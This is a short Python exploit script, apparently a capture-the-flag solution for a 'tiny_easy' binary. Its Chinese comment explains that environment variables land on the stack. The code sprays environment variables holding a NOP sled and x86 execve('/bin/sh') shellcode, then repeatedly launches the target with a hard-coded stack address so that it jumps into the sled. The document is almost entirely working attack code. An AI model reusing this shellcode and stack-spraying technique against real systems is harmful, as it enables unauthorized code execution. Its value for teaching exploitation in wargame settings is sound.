#!/usr/bin/python
'''
这道题的关键在于运行程序时的环境变量会在栈上，所以如果能够控制跳转目标和环境变量，并且栈没有不可执行保护，就可以执行任意代码
https://www.cnblogs.com/likui360/p/6224624.html
https://www.ctolib.com/topics-58041.html
https://blog.csdn.net/magictong/article/details/7391397

就是这个代码能跑出来需要花的时间比较长
'''
import os
import subprocess
jumpto = "\x40\x5c\xe3\xff"
shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nopsled = "\x90"*4096;
payload = nopsled+shellcode
myenv = {}
for i in range(0,100):
        myenv["spray"+str(i)] = payload
        while True:
                p = subprocess.Popen([jumpto], executable="/home/tiny_easy/tiny_easy", env=myenv)
                p.wait()